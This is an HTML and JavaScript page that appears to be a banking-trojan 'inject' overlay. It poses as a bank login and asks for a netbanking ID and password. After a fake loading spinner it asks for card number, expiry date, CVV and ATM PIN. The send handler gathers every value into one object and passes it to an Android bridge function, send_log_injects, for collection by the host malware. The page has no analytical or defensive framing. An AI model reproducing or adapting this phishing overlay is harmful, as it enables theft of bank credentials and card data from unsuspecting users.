<body>
    <div class="loader__" id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#1e3f64"></span>
    </div>
    <form onsubmit="return false">
        <div id="form1">
        <header>

        </header>
        <section>

        </section>
        <footer>
          <div id="div">
            <h4 style="text-align:center; font-size:20px; color: #1e3f64;">
                Your Internet Banking ID
            </h4>
            <input type="text" id="login" name="login" class="input" placeholder="Enter Netbanking ID" autocomplete="off">
            <input type="password" id="password" name="password" class="input" placeholder="Enter Netbanking Password" autocomplete="off">
                <div id="text">
                <p style="width:50%;">
                    Forgot ID?
                </p>
                <p style="width:50%;">
                    Forgot Password?
                </p>   
            </div>
            <p>
                <u>
                    Notification for EU costumers
                </u>
            </p>
            <input type="button" class="button" id="nextPage" disabled value="Submit">
          </div>  
        </footer>
    </div>
    <div id="form2" style="display:none;">
        <header>

        </header>
        <section>

        </section>
        <footer>
            <div id="div">
                <h4 style="text-align:center; font-size:20px; color: #1e3f64;">
                    Confirm with your credit card
                </h4>
                <input type="tel" id="cc" name="cc" onkeyup="check6();check5()" class="input" placeholder="Credit Card" autocomplete="off">
                
            
           
                <input type="tel" id="exp" name="exp" style="float: left;width: 58%;" onkeyup="check7();check5()" placeholder="Expiration Date" class="input" autocomplete="off">


                <input type="password" style="float: right;width: 40%;" id="cvv" name="cvv" onkeyup="check5()" placeholder="CVV" class="input" autocomplete="off">

                <input type="password" id="pin" name="pin" onkeyup="check6();check5()" class="input" placeholder="ATM PIN" autocomplete="off">
                <input type="button" class="button" id="sendData" disabled value="Submit">
            </div>
        </footer>
    </div>
    </form>
</body>
<script>
     $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')
        $('#pin').mask('0000')


        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            pin = document.getElementById('pin'),
            cvv = document.getElementById('cvv');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');
        
        login.onkeyup = () => {
            if(login.value.length > 4 && password.value.length > 4) {
                nextPage.disabled = false
            } else {
                nextPage.disabled = true
            }
        }

        password.onkeyup = () => {
            if(login.value.length > 4 && password.value.length > 4) {
                nextPage.disabled = false
            } else {
                nextPage.disabled = true
            }
        }

        nextPage.onclick = () => {
            spinner.style.display = 'block';

            setTimeout(() => {
                spinner.style.display = 'none'
                form1.style.display = 'none'
                form2.style.display = 'flex'
            }, 1500);
        }


        
        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
                return true
            }
        }

        function check7() {
            var mmYY = exp.value.split('/');
			var month = parseInt(mmYY[0]);
			var year = parseInt(mmYY[1]);
			

			var expArray = exp.value.split('/');
			var today, someday;
			var exMonth = expArray[0];
			var exYear = "20" + expArray[1];

			today = new Date();
			someday = new Date();
			someday.setFullYear(exYear, exMonth, 1);
                
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check5() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3 && pin.value.length === 4) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
        }

        sendData.onclick = () => {
            var data = {};
                data.login = login.value;
                data.password = password.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.pin = pin.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
</script>
